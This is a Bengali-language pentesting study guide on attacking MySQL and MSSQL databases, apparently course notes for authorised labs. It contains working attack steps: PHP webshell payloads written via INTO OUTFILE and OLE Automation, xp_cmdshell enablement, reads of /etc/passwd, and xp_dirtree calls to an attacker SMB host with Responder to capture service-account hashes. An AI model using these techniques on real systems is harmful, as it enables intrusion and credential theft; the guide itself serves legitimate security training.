## 1. SQL Database পরিচিতি

MySQL এবং Microsoft SQL Server (MSSQL) হলো Relational Database Management System (RDBMS)। এগুলো data-কে table, row ও column আকারে সংরক্ষণ করে। Database query ও manage করার জন্য SQL (Structured Query Language) ব্যবহার করা হয়।

Database pentesting-এর গুরুত্বপূর্ণ লক্ষ্য, কারণ এখানে থাকতে পারে:

- User credentials ও passwords
- Personal Identifiable Information (PII)
- Business ও payment data
- Privileged accounts

Database access পেলে privilege অনুযায়ী data access, command execution, privilege escalation এবং lateral movement সম্ভব হতে পারে।

## 2. Enumeration

| Database                            | Default Port |
| ----------------------------------- | ------------ |
| MSSQL                               | TCP/1433     |
| MSSQL Browser                       | UDP/1434     |
| MSSQL hidden mode (source অনুযায়ী) | TCP/2433     |
| MySQL                               | TCP/3306     |

### Nmap দিয়ে service শনাক্ত করা

```
nmap -Pn -sV -sC -p1433 10.10.10.125
```

- `-Pn`: Host discovery skip করে।
- `-sV`: Service ও version শনাক্ত করে।
- `-sC`: Default NSE scripts চালায়।
- `-p1433`: নির্দিষ্ট port scan করে।

Output থেকে পাওয়া যেতে পারে:

- SQL Server version
- Hostname ও domain name
- Service information
- SSL certificate information

এগুলো ব্যবহার করে সম্ভাব্য misconfiguration ও known vulnerability শনাক্ত করা যায়।

## 3. Authentication Mechanisms

### MSSQL Authentication

| Mode                   | ব্যাখ্যা                                                                                                                      |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Windows Authentication | Windows/Active Directory account দিয়ে login। আগে থেকেই authenticated Windows user-কে অতিরিক্ত credentials দিতে নাও হতে পারে। |
| Mixed Mode             | Windows/AD account এবং SQL Server-এর নিজস্ব username-password—দুটিই সমর্থন করে।                                               |

MySQL-এ username-password ছাড়াও plugin-এর মাধ্যমে Windows authentication ব্যবহার করা যায়।

### Authentication Misconfiguration

সম্ভাব্য দুর্বলতা:

- Anonymous access চালু থাকা
- Password ছাড়া account তৈরি করা
- অনুপযুক্ত user, group বা machine-কে access দেওয়া

### CVE-2012-2122

MySQL 5.6.x-এর কিছু version-এ authentication comparison bug-এর কারণে valid username-এর সঙ্গে বারবার ভুল password ব্যবহার করেও authentication bypass হওয়ার সম্ভাবনা ছিল।

মূল ধারণা: Authentication implementation-এর bug কখনো কখনো সঠিক password ছাড়াই access দিতে পারে।

### Database privileges দিয়ে কী করা সম্ভব?

User-এর privilege অনুযায়ী:

- Database data পড়া বা পরিবর্তন করা
- Server configuration পড়া বা পরিবর্তন করা
- OS command execute করা
- Local file পড়া
- অন্য database-এর সঙ্গে যোগাযোগ করা
- Service account-এর hash capture করা
- অন্য user impersonate করা
- অন্য network-এ access পাওয়া

## 4. Database-এ Connect করা

### MySQL

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

- `-u`: Username
- `-p`: Password
- `-h`: Target host

Production environment-এ command line-এ সরাসরি password দিলে তা history বা process information-এ প্রকাশিত হতে পারে। নিরাপদভাবে password prompt ব্যবহার করা ভালো।

### MSSQL — sqlcmd

```
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

- `-S`: SQL Server
- `-U`: Username
- `-P`: Password
- `-y`: Variable-length data-এর maximum display width
- `-Y`: Fixed-length data-এর maximum display width

`-y` ও `-Y` output formatting-এ সাহায্য করে, তবে performance প্রভাবিত হতে পারে।

### MSSQL — sqsh

```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

`-h` output থেকে headers ও footers বাদ দেয়।

### Impacket — mssqlclient.py

```
mssqlclient.py -p 1433 julio@10.129.203.7
```

এটি Impacket-এর MSSQL client। Connect করার সময় password prompt আসতে পারে।

### Windows Authentication

```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

- `SERVERNAME\\accountname`: নির্দিষ্ট server-এর local account
- `.\\accountname`: বর্তমান machine-এর local account

Domain বা hostname নির্দিষ্ট করলে Windows Authentication ব্যবহার করা যায়; তা না হলে SQL Server-এর নিজস্ব account দিয়ে authentication চেষ্টা করা হয়।

| `performance_schema` | Server execution ও performance monitoring                 |

| Database   | কাজ                                        |
| ---------- | ------------------------------------------ |

Note: Permission না থাকলে কোনো database list করা বা connect করা সম্ভব নাও হতে পারে।

## 6. SQL Syntax — Database Enumeration

### Database List করা

MySQL:

```
SHOW DATABASES;
```

MSSQL:

```
SELECT name FROM master.dbo.sysdatabases;
GO
```

`GO` হলো `sqlcmd`-এর batch separator; এটি SQL statement নিজে নয়।

### Database Select করা

MySQL:

```
USE htbusers;
```

MSSQL:

```
USE htbusers;
GO
```

### Table List করা

MySQL:

```
SHOW TABLES;
```

MSSQL:

```
SELECT table_name
FROM htbusers.INFORMATION_SCHEMA.TABLES;
GO
```

### Table-এর সব Data দেখা

MySQL:

```
SELECT * FROM users;
```

MSSQL:

```
SELECT * FROM users;
GO
```

`SELECT *` table-এর সব column ফেরত দেয়। বাস্তব assessment-এ অপ্রয়োজনীয় sensitive data সংগ্রহ না করে প্রয়োজনীয় column নির্বাচন করা উচিত।

## 7. OS Command Execution — MSSQL

MSSQL-এর `xp_cmdshell` একটি extended stored procedure, যা SQL query-এর মাধ্যমে operating-system command চালাতে পারে।

গুরুত্বপূর্ণ বিষয়:

- এটি default অবস্থায় disabled থাকে।
- Enable করতে যথাযথ privilege প্রয়োজন।
- Command SQL Server service account-এর security context-এ চলে।
- এটি synchronous—command শেষ না হওয়া পর্যন্ত caller অপেক্ষা করে।

### Command Execution-এর উদাহরণ

```
EXEC xp_cmdshell 'whoami';
GO
```

### xp_cmdshell Enable করা

শুধু অনুমোদিত lab বা assessment-এ, যথাযথ administrative permission থাকলে:

```
EXECUTE sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO

EXECUTE sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO
```

অন্য command execution পদ্ধতির মধ্যে রয়েছে:

- Extended stored procedures
- CLR Assemblies
- SQL Server Agent Jobs
- External scripts
- `xp_regwrite` — Windows Registry-তে entry লেখার জন্য ব্যবহৃত হতে পারে

MySQL-এ User Defined Function (UDF) ব্যবহার করে C/C++ code SQL function হিসেবে চালানো সম্ভব। উদাহরণ: [lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys?utm_source=chatgpt.com)।

## 8. Local Files-এ Write করা

### MySQL — SELECT INTO OUTFILE

MySQL-এর `SELECT ... INTO OUTFILE` ব্যবহার করে নির্দিষ্ট অনুমোদিত location-এ query result লেখা যায়।

Source-এর উদাহরণ:

```
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/webshell.php';
```

যদি database web server-এর directory-তে write করতে পারে এবং ফাইলটি server-side executable হয়, তাহলে এটি command execution-এর ঝুঁকি তৈরি করতে পারে।

### `secure_file_priv`

MySQL-এর `secure_file_priv` variable file import/export-এর location নিয়ন্ত্রণ করে।

| Value          | অর্থ                                                                       |
| -------------- | -------------------------------------------------------------------------- |
| Empty          | File operation-এর location restriction নেই; অনিরাপদ configuration হতে পারে |
| Directory path | শুধু নির্দিষ্ট directory-তে file operation                                 |
| `NULL`         | File import/export operation নিষ্ক্রিয়                                    |

Value দেখার query:

```
SHOW VARIABLES LIKE "secure_file_priv";
```

File write-এর জন্য যথাযথ `FILE` privilege এবং filesystem permission-ও গুরুত্বপূর্ণ।

### MSSQL — OLE Automation Procedures

MSSQL-এ file write করতে `Ole Automation Procedures` enable করা যায়, যার জন্য administrative privilege দরকার।

```
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO

sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
```

এরপর `sp_OACreate`, `sp_OAMethod` ও `sp_OADestroy`-এর মতো procedure দিয়ে filesystem object ব্যবহার করা যায়। এই feature চালু করলে security risk বাড়তে পারে।

### MSSQL - Create a File

```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```


## 9. Local Files পড়া

### MSSQL — OPENROWSET

```
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents;
GO
```

`SINGLE_CLOB` file content-কে একক character large object হিসেবে পড়ে। সফলতা নির্ভর করে configuration, permission ও file access-এর ওপর।

### MySQL — LOAD_FILE

```
SELECT LOAD_FILE("/etc/passwd");
```

MySQL-এ arbitrary file read default অবস্থায় নিশ্চিত নয়। সাধারণত প্রয়োজন:

- উপযুক্ত `FILE` privilege
- File-এর ওপর server process-এর read permission
- উপযুক্ত `secure_file_priv` configuration

## 10. MSSQL Service Account Hash Capture

MSSQL-এর undocumented stored procedure `xp_dirtree` ও `xp_subdirs` SMB ব্যবহার করে directory listing পাওয়ার চেষ্টা করে। এগুলোকে attacker-controlled SMB server-এ নির্দেশ করা হলে SQL Server service account ওই server-এ NTLM authentication পাঠাতে পারে।

প্রাসঙ্গিক tools:

- [Responder](https://github.com/lgandx/Responder?utm_source=chatgpt.com)
- [Impacket](https://github.com/fortra/impacket?utm_source=chatgpt.com)

### `xp_dirtree`-এর উদাহরণ

```
EXEC master..xp_dirtree '\\10.10.110.17\share\';
GO
```

### `xp_subdirs`-এর উদাহরণ

```
EXEC master..xp_subdirs '\\10.10.110.17\share\';
GO
```

Responder চালানোর source example:

```
sudo responder -I tun0
```

অথবা Impacket SMB server:

```
sudo impacket-smbserver share ./ -smb2support
```

Service account যদি SMB server-এ authenticate করে, তাহলে তার NetNTLMv2 challenge-response capture হতে পারে। এটি সরাসরি plaintext password বা NT password hash নয়। অনুমোদিত lab-এ captured response offline cracking-এর চেষ্টা করা বা security impact মূল্যায়ন করা যায়।

## 11. MSSQL-এ User Impersonation

`IMPERSONATE` permission একজন SQL user-কে অন্য login-এর security context-এ কাজ করার সুযোগ দেয়।

- `sysadmin` users সাধারণত অন্য login impersonate করতে পারে।
- Non-admin users-এর ক্ষেত্রে উপযুক্ত permission দরকার।
- Misconfiguration privilege escalation-এর কারণ হতে পারে।

### Impersonate করা যায় এমন User শনাক্ত করা

```
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
GO
```

### বর্তমান User ও Sysadmin Role যাচাই

```
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

- `SYSTEM_USER`: বর্তমান login দেখায়।
- `IS_SRVROLEMEMBER('sysadmin')`: `1` হলে sysadmin role-এর সদস্য; `0` হলে সদস্য নয়।

### Login Impersonation

```
USE master;
GO

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
```

যদি impersonation সফল হয়, তাহলে বর্তমান session-এ ওই login-এর security context কার্যকর হয়।

আগের context-এ ফেরত যেতে:

```
REVERT;
GO
```

`master` database ব্যবহার করা সুবিধাজনক হতে পারে, কারণ সাধারণত users-এর সেখানে access থাকে। তবে permission ও configuration অনুযায়ী ফলাফল ভিন্ন হতে পারে।

## 12. MSSQL Linked Servers

Linked Server হলো অন্য SQL Server instance বা অন্য database system-এর সঙ্গে সংযোগ, যার মাধ্যমে local server থেকে remote database-এ query চালানো যায়।

যদি linked server-এ ব্যবহৃত account-এর বেশি privilege থাকে, তাহলে lateral movement বা privilege escalation সম্ভব হতে পারে।

### Linked Server শনাক্ত করা

```
SELECT srvname, isremote
FROM sysservers;
GO
```

Source-এর ব্যাখ্যা অনুযায়ী:

- `isremote = 1`: Remote server
- `isremote = 0`: Linked server entry, যা output-এ দেখানো হয়েছে

### Linked Server-এ Query চালানো

```
EXECUTE(
    'SELECT @@servername, @@version, system_user,
    is_srvrolemember(''sysadmin'')'
) AT [10.0.0.12\SQLEXPRESS];
GO
```

এখানে:

- `@@servername`: Server name
- `@@version`: SQL Server version
- `system_user`: Connection-এর বর্তমান user
- `is_srvrolemember('sysadmin')`: Sysadmin membership যাচাই
- `AT [server]`: নির্দিষ্ট linked server-এ query পাঠায়

Quote escaping: Remote query-এর ভেতরে single quote দরকার হলে outer query-তে সেটি double single quote (`''`) দিয়ে escape করতে হয়। একাধিক statement semicolon (`;`) দিয়ে আলাদা করা যায়।

যদি remote connection account-এর `sysadmin` privilege থাকে, তাহলে remote SQL Server-এ database access ও command execution-এর মতো উচ্চ-প্রভাবের কাজ সম্ভব হতে পারে।

## Quick Revision

| Topic                      | গুরুত্বপূর্ণ command / concept              |
| -------------------------- | ------------------------------------------- |
| Port enumeration           | `nmap -Pn -sV -sC -p1433 TARGET`            |
| MySQL connect              | `mysql -u USER -p -h TARGET`                |
| MSSQL connect              | `sqlcmd`, `sqsh`, `mssqlclient.py`          |
| Database list              | `SHOW DATABASES;`                           |
| Table list                 | `SHOW TABLES;`                              |
| Read table                 | `SELECT * FROM users;`                      |
| OS command                 | `xp_cmdshell`                               |
| MySQL file write           | `SELECT ... INTO OUTFILE`                   |
| MySQL file read            | `LOAD_FILE()`                               |
| MSSQL file read            | `OPENROWSET(BULK ...)`                      |

| Impersonation              | `IMPERSONATE`, `EXECUTE AS LOGIN`, `REVERT` |

Pentesting workflow: Port ও version শনাক্ত করো → Authentication ও privileges যাচাই করো → Database ও table enumerate করো → File access ও command execution-এর misconfiguration পরীক্ষা করো → Impersonation ও linked server-এর privilege impact যাচাই করো। সব পরীক্ষা কেবল অনুমোদিত lab বা assessment-এ করবে।
